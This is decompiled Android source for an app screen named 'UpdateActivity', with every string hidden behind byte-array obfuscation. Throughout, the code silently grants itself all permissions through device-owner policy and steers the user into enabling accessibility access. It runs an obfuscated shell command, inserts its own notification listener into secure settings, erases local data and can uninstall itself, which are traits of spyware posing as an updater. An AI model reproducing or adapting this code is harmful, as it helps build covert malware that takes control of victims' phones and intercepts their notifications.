                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str8 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str9 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str10 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i16) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str11 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
        Switch r9 = (Switch) findViewById(R.id.switch22);
        this.f1686i = r9;
        r9.setChecked(C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{-69, 31, 38, -32, 71, -89, -40, 76, -87, 44, 46, -19, 95, -116, -51, 79, -75, 44, 48, -22, 66, -89, -49, 79, -80, 16, 44}, new byte[]{-39, 115, 71, -125, 44, -8, -84, 35}), false));
        this.f1686i.setOnCheckedChangeListener(new C1378k0(29));
        final int i15 = 3;
        ((Switch) findViewById(R.id.switch16)).setOnCheckedChangeListener(new C1418s0(i15, this));
        try {
            str = getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
        } catch (PackageManager.NameNotFoundException unused) {
            str = "";
        }
        this.f1679b.setText(getString(R.string.update_current_version, str));
        this.f1679b.setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i16 = i11;
                final UpdateActivity updateActivity = this.f3455c;
                final int i17 = 1;
                final int i18 = 0;
                switch (i16) {
                    case 0:
                        String str3 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str4 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str5 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str6 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                        arrayList.add(str6);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i18 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i18], 1);
                                            i18++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList6 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList6.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager6 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager6.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList7 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList7.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager7 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager7.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused2) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr2 = new byte[1];
                                        bArr2[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str7 = UpdateActivity.f1678l;
                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i18 < length2) {
                                fileArrListFiles2[i18].delete();
                                i18++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i17 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i17, 6), ((long) i17) * 2000);
                            i17++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i18) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
